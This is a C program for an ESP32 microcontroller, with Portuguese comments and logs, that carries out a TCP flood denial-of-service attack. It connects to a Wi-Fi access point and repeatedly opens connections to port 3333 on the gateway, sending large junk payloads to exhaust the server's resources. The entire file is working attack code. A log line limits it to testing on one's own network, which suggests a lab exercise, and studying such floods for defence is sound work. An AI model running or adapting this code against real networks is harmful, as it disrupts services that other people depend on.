#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/sockets.h"
#include "esp_random.h"

// Configurações do AP alvo
#define TARGET_SSID "ESP32_AP"
#define TARGET_PASS "12345678"
#define TARGET_IP "192.168.4.1"
#define TCP_SERVER_PORT 3333

// Configurações do ataque de flood
#define FLOOD_INTERVAL_MS 10          // Intervalo muito pequeno (100 pacotes/seg)
#define PACKETS_PER_BURST 10          // Mais pacotes TCP por rajada
#define MAX_FLOOD_PACKETS 5000        // Máximo de pacotes para enviar
#define LARGE_PACKET_SIZE 1024        // Tamanho de pacotes grandes
#define TCP_CONNECTIONS_SIMULTANEOUS 5 // Conexões TCP simultâneas

static const char *TAG = "PACKET_FLOOD";
static EventGroupHandle_t s_wifi_event_group;

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1

static int packets_sent = 0;
static int packets_failed = 0;
static bool is_connected = false;
static esp_ip4_addr_t client_ip;
static esp_ip4_addr_t gateway_ip;

// Event handler para eventos do Wi-Fi
static void event_handler(void* arg, esp_event_base_t event_base,
                         int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, "");
        ESP_LOGI(TAG, "Conectando ao alvo para iniciar flood...");
        ESP_LOGI(TAG, "");
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        is_connected = false;
        ESP_LOGW(TAG, "");
        ESP_LOGW(TAG, "Desconectado do alvo!");
        ESP_LOGW(TAG, "");
        
        // Tentar reconectar
        esp_wifi_connect();
        xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        client_ip = event->ip_info.ip;
        gateway_ip = event->ip_info.gw;
        is_connected = true;
        
        ESP_LOGI(TAG, "");
        ESP_LOGI(TAG, "CONECTADO AO ALVO!");
        ESP_LOGI(TAG, "IP do atacante: " IPSTR, IP2STR(&client_ip));
        ESP_LOGI(TAG, "Alvo (Gateway): " IPSTR, IP2STR(&gateway_ip));
        ESP_LOGI(TAG, "Pronto para flood de pacotes!");
        ESP_LOGI(TAG, "");
        
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

// Função para gerar dados de flood TCP específicos
void generate_tcp_flood_data(char* buffer, size_t size, int packet_num)
{
    // Criar pacote grande que vai sobrecarregar o servidor TCP do AP
    snprintf(buffer, size, "TCP_FLOOD_ATTACK_PACKET_%d_TARGETING_AP_SERVER_", packet_num);
    
    // Preencher o resto com dados "lixo" para fazer pacote grande e consumir recursos
    size_t header_len = strlen(buffer);
    for (size_t i = header_len; i < size - 100; i++) {
        // Dados que parecem legítimos mas são apenas para consumir banda/memória
        buffer[i] = 'X' + (i % 10);
    }
    
    // Adicionar timestamp e identificação no final
    snprintf(buffer + size - 100, 100, "_TIMESTAMP_%lu_FLOOD_END_OVERLOAD_TARGET", 
             (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS));
}

// Função para executar rajada intensiva de TCP flood
void execute_tcp_flood_burst(void)
{
    if (!is_connected) {
        ESP_LOGW(TAG, "");
        ESP_LOGW(TAG, "Nao conectado - nao e possivel fazer TCP flood");
        ESP_LOGW(TAG, "");
        return;
    }

    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "EXECUTANDO TCP FLOOD BURST #%d", (packets_sent / PACKETS_PER_BURST) + 1);
    ESP_LOGW(TAG, "Alvo: " IPSTR ":%d (Servidor TCP do AP)", IP2STR(&gateway_ip), TCP_SERVER_PORT);

    for (int i = 0; i < PACKETS_PER_BURST; i++) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = gateway_ip.addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(TCP_SERVER_PORT);
        
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
            packets_failed++;
            continue;
        }
        
        // Configurar timeout baixo para conexões rápidas
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout);
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout);
        
        int err = connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err == 0) {
            char flood_data[LARGE_PACKET_SIZE];
            generate_tcp_flood_data(flood_data, sizeof(flood_data), packets_sent + i + 1);
            
            int sent = send(sock, flood_data, strlen(flood_data), 0);
            if (sent > 0) {
                ESP_LOGW(TAG, "TCP FLOOD #%d enviado (%d bytes) -> Servidor TCP do AP", 
                         packets_sent + i + 1, sent);
                
                // Tentar manter conexão aberta brevemente para consumir recursos
                vTaskDelay(pdMS_TO_TICKS(50));
            } else {
                packets_failed++;
                ESP_LOGD(TAG, "Falha no envio TCP #%d", packets_sent + i + 1);
            }
        } else {
            packets_failed++;
            ESP_LOGD(TAG, "Falha na conexao TCP #%d para servidor do AP", packets_sent + i + 1);
        }
        
        close(sock);
        
        // Pequeno delay entre conexões para não sobrecarregar o próprio ESP32
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    
    packets_sent += PACKETS_PER_BURST;
    ESP_LOGW(TAG, "TCP flood burst completo! Total enviado: %d", packets_sent);
    ESP_LOGW(TAG, "");
}

// Função para mostrar estatísticas do TCP flood
void show_flood_stats(void)
{
    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "=== ESTATISTICAS DO TCP FLOOD ===");
    ESP_LOGW(TAG, "Alvo: %s (" IPSTR ":%d)", TARGET_SSID, IP2STR(&gateway_ip), TCP_SERVER_PORT);
    ESP_LOGW(TAG, "Protocolo: TCP (servidor do AP)");
    ESP_LOGW(TAG, "Pacotes TCP enviados: %d", packets_sent);
    ESP_LOGW(TAG, "Conexoes falhadas: %d", packets_failed);
    ESP_LOGW(TAG, "Taxa de sucesso: %.1f%%", 
             packets_sent > 0 ? (float)(packets_sent - packets_failed) / packets_sent * 100 : 0);
    ESP_LOGW(TAG, "Taxa atual: ~%d conexoes/seg", 
             (1000 / FLOOD_INTERVAL_MS) * PACKETS_PER_BURST);
    ESP_LOGW(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
    ESP_LOGW(TAG, "Status: %s", is_connected ? "CONECTADO" : "DESCONECTADO");
    ESP_LOGW(TAG, "==========================================");
    ESP_LOGW(TAG, "");
}

// Task principal do ataque de TCP flood
static void packet_flood_attack_task(void *pvParameters)
{
    ESP_LOGW(TAG, "INICIANDO TCP FLOOD ATTACK!");
    ESP_LOGW(TAG, "Alvo: %s", TARGET_SSID);
    ESP_LOGW(TAG, "Porta TCP alvo: %d (servidor do AP)", TCP_SERVER_PORT);
    ESP_LOGW(TAG, "Intervalo: %d ms", FLOOD_INTERVAL_MS);
    ESP_LOGW(TAG, "Conexoes TCP por rajada: %d", PACKETS_PER_BURST);
    ESP_LOGW(TAG, "Maximo de pacotes TCP: %d", MAX_FLOOD_PACKETS);
    ESP_LOGW(TAG, "Tamanho do pacote TCP: %d bytes", LARGE_PACKET_SIZE);
    
    // Aguardar conexão inicial
    while (!is_connected) {
        ESP_LOGI(TAG, "Aguardando conexão...");
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
    
    ESP_LOGW(TAG, "Conectado! Iniciando TCP flood contra servidor do AP em 3 segundos...");
    vTaskDelay(pdMS_TO_TICKS(3000));
    
    while (packets_sent < MAX_FLOOD_PACKETS && is_connected) {
        // Executar apenas TCP flood direcionado ao servidor do AP
        execute_tcp_flood_burst();
        
        // Mostrar estatísticas a cada 100 pacotes
        if (packets_sent % 100 == 0 && packets_sent > 0) {
            show_flood_stats();
        }
        
        // Aguardar próxima rajada
        vTaskDelay(pdMS_TO_TICKS(FLOOD_INTERVAL_MS));
    }
    
    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "TCP FLOOD ATTACK CONCLUIDO!");
    ESP_LOGW(TAG, "");
    show_flood_stats();
    
    vTaskDelete(NULL);
}

// Função para inicializar Wi-Fi
void wifi_init_packet_flooder(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = TARGET_SSID,
            .password = TARGET_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {
                .capable = true,
                .required = false
            },
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "Wi-Fi configurado para TCP flood!");
    ESP_LOGI(TAG, "");
}

void app_main(void)
{
    // Inicializar NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "=== TCP FLOOD ATTACKER INICIADO ===");
    ESP_LOGW(TAG, "ATENCAO: Este programa executa TCP flood REAL!");
    ESP_LOGW(TAG, "Ele ira sobrecarregar o servidor TCP do AP!");
    ESP_LOGW(TAG, "Use apenas em redes proprias para teste!");
    ESP_LOGW(TAG, "Preparando para atacar servidor TCP na porta 3333...");
    ESP_LOGW(TAG, "");
    
    // Inicializar Wi-Fi
    wifi_init_packet_flooder();
    
    // Aguardar um pouco antes de iniciar o ataque
    vTaskDelay(pdMS_TO_TICKS(3000));
    
    // Iniciar task de ataque de flood
    xTaskCreate(packet_flood_attack_task, "packet_flood_task", 8192, NULL, 5, NULL);
    
    ESP_LOGW(TAG, "");
    ESP_LOGW(TAG, "Sistema TCP flood ativo!");
    ESP_LOGW(TAG, "");
}
